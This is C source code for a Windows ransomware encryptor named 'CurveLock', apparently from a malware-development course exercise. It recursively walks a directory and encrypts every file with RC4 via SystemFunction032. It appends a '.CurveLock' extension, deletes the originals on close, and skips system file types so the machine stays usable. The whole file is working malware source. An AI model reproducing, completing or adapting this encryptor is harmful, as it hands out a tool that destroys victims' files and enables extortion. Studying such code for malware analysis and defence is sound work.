#include <stdio.h>
#include <Windows.h>

#pragma warning(disable : 4996)


#define ENCRYPTED_FILE_EXTENSION	L".CurveLock"
#define ENC_FILE_SIGNATURE			'CVLK'

#define MAX_FILE_SIZE_TO_ENC		0x6400000 // 104857600 - 100MB
#define RC4_KEY_SIZE				32

// ===================================================================================================================================================

#define GET_FILE_EXTENSION_W(FilePath)		(wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)

// ===================================================================================================================================================

typedef struct _ENCRYPTED_FILE_HEADER {

	BYTE	Signature[0x04];
	BYTE	pRc4EncryptionKey[RC4_KEY_SIZE];

}ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);

// ===================================================================================================================================================

BOOL Rc4EncryptionViaSystemFunc032(IN ULONG_PTR uFileBuffer, IN DWORD dwFileSize, IN OUT PENCRYPTED_FILE_HEADER pEncryptedFileHdr) {

	NTSTATUS				STATUS = NULL;
	HMODULE					hAdvapi32 = NULL;
	fnSystemFunction032		SystemFunction032 = NULL;
	unsigned short			us2RightMostBytes = NULL;
	USTRING					UsBuffer = { 0 };
	USTRING					UsKey = { 0 };

	us2RightMostBytes = (unsigned short)(((uFileBuffer & 0xFFFF) ^ (dwFileSize && 0xFF)) % 0xFFFF);

	for (int i = 0; i < RC4_KEY_SIZE; i++) {
		pEncryptedFileHdr->pRc4EncryptionKey[i] = (__TIME__[i % 6] * rand() + us2RightMostBytes) % 0xFF;
		srand(__TIME__[rand() % 6] + us2RightMostBytes);
	}

	UsBuffer.Buffer = uFileBuffer;
	UsBuffer.Length = dwFileSize;
	UsBuffer.MaximumLength = dwFileSize;

	UsKey.Buffer = pEncryptedFileHdr->pRc4EncryptionKey;
	UsKey.Length = RC4_KEY_SIZE;
	UsKey.MaximumLength = RC4_KEY_SIZE;

	if (!(hAdvapi32 = LoadLibraryW(L"Advapi32"))) {
		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&UsBuffer, &UsKey)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// ===================================================================================================================================================


BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {

	HANDLE					hSourceFile = INVALID_HANDLE_VALUE,
		hDestinationFile = INVALID_HANDLE_VALUE;
	ULONG_PTR				uFileBufferAddr = NULL,
		uEncryptedFileBufferAddr = NULL,
		uTmpPntrVar = NULL;
	DWORD					dwTmpSizeVar = 0x00,
		dwFileBufferSize = 0x00,
		dwNumberOfBytesRead = 0x00,
		dwNumberOfBytesWritten = 0x00;
	BOOL					bResult = FALSE;
	PWCHAR					pwcDuplicateStr = NULL,
		pwcOgFileExtension = NULL,
		pwcEncryptedFilePath = NULL;
	ENCRYPTED_FILE_HEADER	EncryptedFileHeader = { 0 };
	WCHAR* szBlackListedExtensions[11] = { ENCRYPTED_FILE_EXTENSION, L".exe", L".dll", L".sys", L".ini", L".conf", L".cfg", L".reg", L".dat", L".bat", L".cmd" };

	if (!szFilePathToEncrypt)
		return FALSE;

	RtlSecureZeroMemory(&EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));

	if (!(pwcDuplicateStr = _wcsdup(szFilePathToEncrypt)))
		goto _END_OF_FUNC;

	dwTmpSizeVar = (wcslen(pwcDuplicateStr) + wcslen(ENCRYPTED_FILE_EXTENSION) + 0x01) * sizeof(WCHAR);

	if (!(uTmpPntrVar = pwcEncryptedFilePath = (PWCHAR)malloc(dwTmpSizeVar)))
		goto _END_OF_FUNC;
	else
		swprintf_s(pwcEncryptedFilePath, dwTmpSizeVar, L"%s%s", pwcDuplicateStr, ENCRYPTED_FILE_EXTENSION);

	if (!(pwcOgFileExtension = GET_FILE_EXTENSION_W(szFilePathToEncrypt)))
		goto _END_OF_FUNC;

	for (int i = 0; i < 11; i++) {
		if (wcscmp(pwcOgFileExtension, szBlackListedExtensions[i]) == 0x00) {
			printf("[!] Blacklisted File Extension [%ws] \n", szBlackListedExtensions[i]);
			goto _END_OF_FUNC;
		}
	}

	*(ULONG*)&EncryptedFileHeader.Signature = ENC_FILE_SIGNATURE;

	if ((hDestinationFile = CreateFileW(pwcEncryptedFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hSourceFile = CreateFileW(szFilePathToEncrypt, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (dwFileBufferSize >= MAX_FILE_SIZE_TO_ENC) {
		printf("[!] File Size Exceeds The Limit (100MB) \n");
		goto _END_OF_FUNC;
	}

	if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(uEncryptedFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(dwFileBufferSize + sizeof(ENCRYPTED_FILE_HEADER))))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hSourceFile, uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
		printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	if (*(ULONG*)uFileBufferAddr == ENC_FILE_SIGNATURE) {
		printf("[!] File Already Encrypted \n");
		goto _END_OF_FUNC;
	}

	if (!Rc4EncryptionViaSystemFunc032((PBYTE)uFileBufferAddr, dwFileBufferSize, &EncryptedFileHeader))
		goto _END_OF_FUNC;

	memcpy((PBYTE)uEncryptedFileBufferAddr, &EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));
	memcpy((PBYTE)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), (PBYTE)uFileBufferAddr, dwFileBufferSize);

	dwFileBufferSize = dwNumberOfBytesRead + sizeof(ENCRYPTED_FILE_HEADER);

	if (!WriteFile(hDestinationFile, uEncryptedFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesWritten, NULL) || dwFileBufferSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	if (!FlushFileBuffers(hDestinationFile)) {
		printf("[!] FlushFileBuffers Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetEndOfFile(hDestinationFile)) {
		printf("[!] SetEndOfFile Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hSourceFile != INVALID_HANDLE_VALUE)
		CloseHandle(hSourceFile);
	if (hDestinationFile != INVALID_HANDLE_VALUE)
		CloseHandle(hDestinationFile);
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (uTmpPntrVar)
		free(uTmpPntrVar);
	if (uFileBufferAddr)
		LocalFree((HLOCAL)uFileBufferAddr);
	if (uEncryptedFileBufferAddr)
		LocalFree((HLOCAL)uEncryptedFileBufferAddr);
	return bResult;
}

// ===================================================================================================================================================

BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {

	if (!szDirectoryPath)
		return FALSE;

	WIN32_FIND_DATAW	FindFileData = { 0x00 };
	WCHAR				szDirPath[MAX_PATH * 2] = { 0x00 };
	WCHAR				szFullStrPath[MAX_PATH * 2] = { 0x00 };
	HANDLE				hFind = INVALID_HANDLE_VALUE;
	BOOL				bResult = FALSE;

	_snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

	if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
		printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
			continue;

		_snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			printf("[*] Directory: %ws\n", szFullStrPath);

			if (!EncryptFilesInGivenDir(szFullStrPath))
				goto _END_OF_FUNC;
		}

		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			printf("\t> Encrypting File: %ws ... %s \n", szFullStrPath, ReplaceWithEncryptedFile(szFullStrPath) ? "[+] DONE" : "[-] Failed");

	} while (FindNextFileW(hFind, &FindFileData));

	bResult = TRUE;

_END_OF_FUNC:
	if (hFind != INVALID_HANDLE_VALUE)
		FindClose(hFind);
	return bResult;
}

// Main Function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
    EncryptFilesInGivenDir(DirectoryPath);
    return 0;
}
